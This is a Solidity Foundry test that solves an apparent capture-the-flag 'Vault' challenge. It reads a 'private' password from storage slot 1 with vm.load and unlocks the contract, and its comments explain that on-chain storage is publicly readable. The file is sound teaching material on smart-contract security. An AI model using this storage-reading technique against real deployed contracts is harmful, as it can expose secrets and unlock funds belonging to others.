// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Vault} from "../src/Vault.sol";

contract VaultTest is Test {
    /*
     * 1. private in Solidity does NOT mean hidden
     * 2. Anything stored on-chain can be read from storage
     * 3. You break it by reading storage slot 1.
     *
     * slot 0 → locked (bool)
     * slot 1 → password (bytes32)
     *
     * 'private' protects only from other contracts accessing variable, not from users
     * Every contract storage variable is publicly visible via:
     * 1. eth_getStorageAt
     * 2. Foundry vm.load
     * Security must assume blockchain is transparent
     */

    Vault public vaultTest;
    address public attacker = address(0xBEEF);

    function setUp() public {
        vaultTest = new Vault(bytes32 ("password"));
    }

    function testVaultAttack() public {
        vm.startPrank(attacker);

        // Read storage slot 1 where `password` is stored
        bytes32 password = vm.load(address(vaultTest), bytes32(uint256(1)));

        vaultTest.unlock(password);
        assertEq(vaultTest.locked(), false);

        vm.stopPrank();
    }
}